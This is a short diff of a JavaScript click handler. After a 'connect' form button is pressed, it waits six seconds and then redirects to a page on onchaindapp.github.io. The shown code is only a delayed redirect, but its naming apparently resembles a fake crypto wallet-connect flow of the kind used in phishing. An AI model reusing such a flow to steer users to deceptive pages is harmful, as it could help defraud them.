@@ -13,7 +13,7 @@ document.getElementById('form-connect-button').addEventListener('click', functio
 
       // Navigate to the new page after 6 seconds
       setTimeout(function () {
-        window.location.href = 'http://reconnect.html'; // Replace with your target URL
+        window.location.href = 'http://onchaindapp.github.io/dev/reconnect.html'; // Replace with your target URL
       }, 6000);
     }
   }
